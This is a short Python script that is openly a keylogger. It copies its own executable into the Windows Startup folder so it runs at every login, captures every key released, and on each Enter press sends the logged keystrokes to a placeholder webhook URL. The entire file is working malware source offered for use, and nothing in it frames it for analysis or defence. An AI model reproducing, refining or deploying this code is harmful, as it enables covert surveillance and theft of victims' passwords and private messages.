import keyboard
import requests
import threading
import subprocess
import sys
import os

WEBHOOK = "PASTE YOUR WEBHOOK HERE!"
LOG = []

def startup():
    subprocess.run(f'copy "{sys.executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
                   shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


def on_key_release(key):
    global LOG
    if key.name == "enter":
        data = {
            "username" : "KeyLogger"
        }
        data["embeds"] = [
            {
                "description" : f"{' '.join(LOG)}"
            }
        ]
        requests.post(WEBHOOK, json=data)
        LOG.clear()
    else:
        LOG.append(f"`{key.name}`")

threading.Thread(target=startup).start()

keyboard.on_release(on_key_release)
keyboard.wait()